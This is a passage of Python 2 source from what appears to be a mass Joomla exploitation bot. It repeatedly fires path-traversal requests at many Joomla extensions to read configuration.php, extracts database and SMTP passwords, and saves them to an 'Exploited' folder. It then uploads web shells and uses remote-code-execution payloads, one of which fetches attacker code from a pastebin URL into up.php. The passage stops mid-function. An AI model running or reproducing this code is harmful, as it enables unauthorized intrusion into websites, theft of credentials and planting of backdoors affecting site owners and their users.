        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/smtps.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('SMTPHost: ' + smtphost + '\n')
            joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
            joomla_configs.write('SMTPPass: ' + smtppass + '\n')
            joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n') 




    req = requests.get(url + '/index.php?option=com_jtagmembersdirectory&task=attachment&download_file=/../../../../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[0m[$]\033[0m\033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/smtps.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('SMTPHost: ' + smtphost + '\n')
            joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
            joomla_configs.write('SMTPPass: ' + smtppass + '\n')
            joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n') 




    req = requests.get(url + '/index.php?option=com_macgallery&view=download&albumid=../../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[0m[$]\033[0m\033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/smtps.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('SMTPHost: ' + smtphost + '\n')
            joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
            joomla_configs.write('SMTPPass: ' + smtppass + '\n')
            joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n') 



    req = requests.get(url + '/index.php?option=com_facegallery&task=imageDownload&img_name=../../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[0m[$]\033[0m\033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/smtps.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('SMTPHost: ' + smtphost + '\n')
            joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
            joomla_configs.write('SMTPPass: ' + smtppass + '\n')
            joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n') 


    req = requests.get(url + '/plugins/content/s5_media_player/helper.php?fileurl=../../../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[0m[$]\033[0m\033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/smtps.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('SMTPHost: ' + smtphost + '\n')
            joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
            joomla_configs.write('SMTPPass: ' + smtppass + '\n')
            joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n') 



    req = requests.get(url + '/components/com_docman/dl2.php?archive=0&file=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[0m[$]\033[0m\033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/smtps.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('SMTPHost: ' + smtphost + '\n')
            joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
            joomla_configs.write('SMTPPass: ' + smtppass + '\n')
            joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n') 



    req = requests.get(url + '/modules/mod_dvfoldercontent/download.php?f=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[0m[$]\033[0m\033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/smtps.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('SMTPHost: ' + smtphost + '\n')
            joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
            joomla_configs.write('SMTPPass: ' + smtppass + '\n')
            joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n') 


    req = requests.get(url + '/index.php?option=com_addproperty&task=listing&propertyId=73&action=filedownload&fname=../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[0m[$]\033[0m\033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/smtps.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('SMTPHost: ' + smtphost + '\n')
            joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
            joomla_configs.write('SMTPPass: ' + smtppass + '\n')
            joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n') 



    req = requests.get(url + '/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[0m[$]\033[0m\033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/smtps.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('SMTPHost: ' + smtphost + '\n')
            joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
            joomla_configs.write('SMTPPass: ' + smtppass + '\n')
            joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n') 



    req = requests.get(url + '/index.php?option=com_jetext&task=download&file=../../configuration.phF', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[0m[$]\033[0m\033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/smtps.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('SMTPHost: ' + smtphost + '\n')
            joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
            joomla_configs.write('SMTPPass: ' + smtppass + '\n')
            joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n') 




    req = requests.get(url + '/index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[0m[$]\033[0m\033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/smtps.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('SMTPHost: ' + smtphost + '\n')
            joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
            joomla_configs.write('SMTPPass: ' + smtppass + '\n')
            joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n') 




    req = requests.get(url + '/plugins/content/wd/wddownload.php?download=wddownload.php&file=../../../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[0m[$]\033[0m\033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/smtps.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('SMTPHost: ' + smtphost + '\n')
            joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
            joomla_configs.write('SMTPPass: ' + smtppass + '\n')
            joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n') 




    req = requests.get(url + '/index.php?jat3action=gzip&type=css&file=configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[0m[$]\033[0m\033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/smtps.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('SMTPHost: ' + smtphost + '\n')
            joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
            joomla_configs.write('SMTPPass: ' + smtppass + '\n')
            joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n') 



    req = requests.get(url + '/index.php?option=com_community&view=groups&groupid=33&task=app&app=groupfilesharing&do=download&file=../../../../configuration.php&Itemid=0', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[0m[$]\033[0m\033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/smtps.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('SMTPHost: ' + smtphost + '\n')
            joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
            joomla_configs.write('SMTPPass: ' + smtppass + '\n')
            joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n') 




    req = requests.get(url + '/index.php?option=com_download-monitor&file=configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[0m[$]\033[0m\033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/smtps.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('SMTPHost: ' + smtphost + '\n')
            joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
            joomla_configs.write('SMTPPass: ' + smtppass + '\n')
            joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n') 

############################## For shells ########################################
def joomlaaa(url):	

    try:

		#b2jj

		formup = {'file':(filenames, shell, 'text/html')}
		
		formreq = requests.post(url+'/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&qqfile=/../../../', files=formup)
		
		formlib = requests.get(url+'/components/com_b2jcontact/'+filenames)
		
		
		if 'MisterSpyv7' in formlib.content:
			print '\033[92m[>] \033[0mExploit b2jcontact  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/components/com_b2jcontact/'+filenames+'\n')
		else:
			print '\033[92m[>] \033[0mExploit b2jcontact  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
		
	
	
		#smtp	
			
		url = url.strip()
			
		lib = urllib2.urlopen(url)
				
		text = lib.read()
			
		if 'public' in text:
			hoststmp = re.findall("smtphost = '(.*?)';",text)
			userstmp = re.findall("smtpuser = '(.*?)';",text)
			passstmp = re.findall("smtppass = '(.*?)';",text)
			portstmp = re.findall("smtpport = '(.*?)';",text)
			print '\033[92m[>] \033[0mExploit SMTP  \033[92m[Done] '+'Host:'+hoststmp[0]+'|'+'Port:'+portstmp[0]+'|'+'User:'+userstmp[0]+'|'+'Password:'+passstmp[0]
			open('Exploited/STMPS.txt', 'a').write(hoststmp[0]+'|'+portstmp[0]+'|'+userstmp[0]+'|'+passstmp[0]+'\n')
				
		else:
			print '\033[92m[>] \033[0mExploit SMTP  \033[91m[Failed] '		



		#1 Joomla RCE
		
		global payload
		payload_generated = generate(payload)
		prepare(url, payload_generated)

		
		aaReflexlib = requests.get(url+'/Manager.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
			print '\033[92m[>] \033[0mExploit Joomla RCE  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/Manager.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Joomla RCE  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)


		#rce

		pl = generate_payload("fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/up.php','w+'),file_get_contents('https://pastebin.com/raw/7Rz3Zujk'));")
			
		rce_url(url,pl)
			
		req_rce = requests.get(url+'/up.php?Mah')
			
		if 'MisterSpyShellForV7Bot0X_istanbul_2019_Ye' in req_rce.content:
			
			print '\033[92m[>] \033[0mExploit Rce  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/shells.txt', 'a').write(url+'/up.php?Mah'+'\n')
		
		
		else:
			
			print '\033[92m[>] \033[0mExploit Rce  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
		
		
		#foxcontact
			check_fox = requests.get(url+'/index.php?option=com_foxcontact&amp;view=invalid')
			
			if 'com_foxcontact' in check_fox.content:
